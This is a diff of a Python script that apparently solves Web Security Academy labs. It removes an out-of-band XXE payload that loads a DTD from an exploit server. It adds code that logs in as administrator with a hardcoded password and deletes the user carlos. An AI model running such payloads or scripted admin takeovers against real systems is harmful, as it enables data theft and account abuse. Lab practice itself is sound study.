@@ -6,20 +6,49 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from urllib.parse import quote
 
-url = 'https://0a46001a0309eaae84c78cb100090086.web-security-academy.net'
+url = 'https://0a7e009004fa9699800121fe005500db.web-security-academy.net'
 
 session=requests.Session()
 
-data = '<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE abc [<!ENTITY % cuong SYSTEM "https://exploit-0acd00280309eaf2848f8b16012300aa.exploit-server.net/exploit.dtd">
-%cuonhng;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
-
-
-
-response= session.post(
-    url + '/product/stock',
-    data=data,
+response = session.get(
+    url +'/login',
     verify=False,
 )
 
-print(response.text)
+soup = BeautifulSoup(response.text, 'html.parser')
+csrf = soup.find('input', {'name': 'csrf'})['value']
+session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
+
+cookies = {
+    'session': session_data,
+}
+
+ADMIN_PASSWORD = 'wli2f2dwpjhhp5x7k4hl'
+
+data = {
+    'csrf': csrf,
+    'username': 'administrator',
+    'password': ADMIN_PASSWORD,
+}
+
+response = session.post(
+    url+'/login',
+    cookies=cookies,
+    data=data,
+    verify=False,
+    allow_redirects=False
+)
+
+session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
+cookies = {
+    'session': session_data,
+}
+
+response = session.get(
+    url +'/admin/delete?username=carlos',
+    cookies=cookies,
+    verify=False,
+)
+
+soup = BeautifulSoup(response.text,'html.parser')
+print(soup)
